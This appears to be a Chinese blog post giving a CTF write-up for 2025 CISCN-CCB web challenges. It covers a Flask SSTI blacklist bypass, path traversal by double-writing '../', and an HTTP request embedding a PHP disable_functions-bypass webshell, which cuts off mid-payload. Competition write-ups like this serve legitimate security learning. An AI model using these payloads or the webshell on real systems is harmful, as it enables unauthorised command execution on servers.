<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="webSafe_Proxy主页直接给代码了 先改代码 1234567891011@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&quot;POST&quot;])def template():    template_code &#x3D; request.form.get(&quot;code&quot;)    # 安全过滤    blacklist &#x3D; [&#39;__&#39;, &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;eval&#39;, &#39;sub">
<meta property="og:type" content="article">
<meta property="og:title" content="2025CISCN-CCB">
<meta property="og:url" content="https://luhaozhhhe.github.io/2025/02/01/2025CISCN-CCB/index.html">
<meta property="og:site_name" content="Welcome To Luhaozhhhe&#39;s Blog!">
<meta property="og:description" content="webSafe_Proxy主页直接给代码了 先改代码 1234567891011@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&quot;POST&quot;])def template():    template_code &#x3D; request.form.get(&quot;code&quot;)    # 安全过滤    blacklist &#x3D; [&#39;__&#39;, &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;eval&#39;, &#39;sub">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/1280X1280.PNG">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/1.PNG">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/2.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/3.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/4.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/5.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/6.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/7.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/8.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/9.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/10.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/11.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/12.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/13.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/14.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/15.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/16.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/17.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/18.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/19.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/20.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/21.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/22.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/23.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/24.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/25.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/26.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/27.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/28.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/29.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/30.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/31.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/32.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/33.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/34.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/35.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/36.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/37.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/38.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/39.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/40.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/41.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/42.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/43.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/44.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/45.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/46.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/477.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/47.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/48.png">
<meta property="article:published_time" content="2025-02-01T01:28:37.000Z">
<meta property="article:modified_time" content="2025-02-01T01:52:09.618Z">
<meta property="article:author" content="Luhaozhhhe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://luhaozhhhe.github.io/images/2025CISCN-CCB/1280X1280.PNG">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>






  <link rel="canonical" href="https://luhaozhhhe.github.io/2025/02/01/2025CISCN-CCB/"/>





  <title>2025CISCN-CCB | Welcome To Luhaozhhhe's Blog!</title>
  








<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Welcome To Luhaozhhhe's Blog!</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">NKUSEer小菜鸡一枚，记录学习笔记、CTF竞赛、学习心得等内容~</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2025/02/01/2025CISCN-CCB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">2025CISCN-CCB</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2025-02-01T09:28:37+08:00">
                2025-02-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
                    <span itemprop="name">WriteUp</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h3><p>主页直接给代码了</p>
<p>先改代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">"POST"</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">"code"</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">'__'</span>, <span class="string">'import'</span>, <span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'eval'</span>, <span class="string">'subprocess'</span>, <span class="string">'popen'</span>, <span class="string">'system'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Forbidden content detected!"</span></span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(template_code)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>需要把result返回，并且要把传入的code输出用来记录payload</p>
<p>然后把flask监听改成0.0.0.0</p>
<p>然后fenjing直接梭</p>
<p>fenjing webui</p>
<p><img src="/images/2025CISCN-CCB/1280X1280.PNG" alt=""></p>
<p>直接爆破即可，最终日志得到执行命令的payload，注意需要</p>
<p><img src="/images/2025CISCN-CCB/1.PNG" alt=""></p>
<p>可以得到ls的payload</p>
<p>将flag写入app.py，之后直接通过get的方式读取__file__</p>
<p><img src="/images/2025CISCN-CCB/2.png" alt=""></p>
<p><img src="/images/2025CISCN-CCB/3.png" alt=""></p>
<h3 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h3><p><img src="/images/2025CISCN-CCB/4.png" alt=""></p>
<p>随便输点，可以看到../hackme.php和tips.php</p>
<p>../经过尝试猜测被过滤，双写进行绕过</p>
<p><img src="/images/2025CISCN-CCB/5.png" alt=""></p>
<p>tips有phpinfo，然后可以看到一堆disable function</p>
<p>hackme有一段代码，大概是这样的</p>
<p><img src="/images/2025CISCN-CCB/6.png" alt=""></p>
<p>这张是当时调试的图片，忘记截屏了</p>
<p>base64可以解码</p>
<p><img src="/images/2025CISCN-CCB/7.png" alt=""></p>
<p>把里面eval改成echo，可以看到执行的内容，前提是把这段代码和前面刚刚那个截屏放在一起</p>
<p><img src="/images/2025CISCN-CCB/8.png" alt=""></p>
<p>然后传参数的时候要注意php非法参数名的事情</p>
<p>需要传cmd[66.99=xxx</p>
<p>之后因为有disbale function，使用github的项目绕过即可</p>
<p><a target="_blank" rel="noopener" href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php</a></p>
<p>用这个shell.php</p>
<p>之后稍微改一下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?file=../....//hackme.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2ze4xxsimq68wmh5do7k.cloudeci1.ichunqiu.com:80</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://eci-2ze8chizbklyqw43ji9i.cloudeci1.ichunqiu.com/index.php?file=hello.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml">cmd[66.99=</span><span class="template-variable">{{<span class="name">url</span>(<span class="name">?</span>&gt;&lt;?php</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo <span class="string">"Disable functions: "</span> . ini_get(<span class="name">"disable_functions"</span>) . <span class="string">"\n"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$command = isset(<span class="name">$_GET</span>['cmd']) ? $_GET['cmd'] : <span class="string">'id'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo <span class="string">"Run command: $command\n====================\n"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">if(<span class="name">is_x64</span>()){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">ARCH</span>, <span class="number">64</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">ARCH</span>, <span class="number">32</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$OS = strtoupper(<span class="name">substr</span>(<span class="name">PHP_OS</span>,<span class="number">0</span>,<span class="number">3</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">if(<span class="name">$OS</span> === <span class="string">'WIN'</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">OS</span>, <span class="string">'Windows'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}elseif (<span class="name">$OS</span> === <span class="string">'DAR'</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    